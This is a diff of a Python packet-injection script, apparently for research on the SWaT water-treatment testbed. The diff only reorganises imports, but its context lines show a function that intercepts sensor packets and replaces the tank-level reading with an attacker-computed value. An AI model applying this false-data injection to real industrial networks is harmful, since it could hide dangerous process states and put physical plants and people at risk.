@@ -33,9 +33,9 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import scaling
-import swat
 from commons.util import RepeatEvery
+from swat.plc1 import SWAT_P1_RIO_AI
+from swat.scaling import current_to_signal, signal_to_current, P1Level
 
 DIA = 1.38  # Tank 1 diameter
 FLOW_BIAS = 0.8  # Water flow in m^3/h
@@ -54,14 +54,14 @@ thread = RepeatEvery(1, calculate_attack)
 
 def __inject(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_AI in pkt:
+    if SWAT_P1_RIO_AI in pkt:
         global _elevel, _alevel, _is_first_pck
         if _is_first_pck:
-            _elevel = _alevel = scaling.current_to_signal(pkt[swat.SWAT_P1_RIO_AI].level, scaling.P1Level) / 1000
+            _elevel = _alevel = current_to_signal(pkt[SWAT_P1_RIO_AI].level, P1Level) / 1000
             thread.start()
             _is_first_pck = False
-        alevel = scaling.signal_to_current(_alevel * 1000, scaling.P1Level)
-        pkt[swat.SWAT_P1_RIO_AI].level = alevel
+        alevel = signal_to_current(_alevel * 1000, P1Level)
+        pkt[SWAT_P1_RIO_AI].level = alevel
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
